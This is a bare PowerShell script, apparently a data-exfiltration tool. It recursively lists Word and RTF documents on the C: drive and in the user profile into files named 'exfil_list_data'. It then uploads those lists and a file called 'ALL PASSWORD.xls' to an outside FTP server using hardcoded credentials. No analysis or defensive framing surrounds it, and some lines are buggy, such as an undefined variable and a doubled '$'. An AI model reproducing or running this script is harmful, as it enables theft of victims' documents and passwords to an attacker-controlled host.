New-Item -ItemType Directory -Force -Path C:\Microsoft\Windows\Desktop\Privdata\lifxe
$ScriptDir = "C:\Microsoft\Windows\Desktop\Privdata\lifxe"
Get-Childitem "C:\" -recurse -filter "*X*.docx" | Out-File -Append "$ScriptDir\exfil_list_data.txt"
Get-Childitem "C:\" -recurse -filter "*X*.doc" | Out-File -Append "$ScriptDir\exfil_list_data.txt"
Get-Childitem "C:\" -recurse -filter "*X*.rtf" | Out-File -Append "$ScriptDir\exfil_list_data.txt"
Get-Childitem $env:UserProfile -recurse -filter "*Xii*.docx" | Out-File -Append "$ScriptDir\exfil_list_data_xii.txt"
$Username="b7_19204341"
$Password="wpzhj2x8"
$FilePathLIST="$ScriptDir\exfil_list_data.txt"
$FilePathLIST_X="$ScriptDir\exfil_list_data_xii.txt"
$FilePathpass="C:\ALL PASSWORD.xls"
$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential($UserName, $Password)
$file = Get-Item -Path $FilePath
$uri = New-Object System.Uri("ftp://ftp.byethost7.com/htdocs/$($file.Name)")
$webclient.UploadFile($uri, $FilePathLIST)
$webclient.UploadFile($uri, $FilePathpass)
$webclient.UploadFile($uri, $$FilePathLIST_X)
exit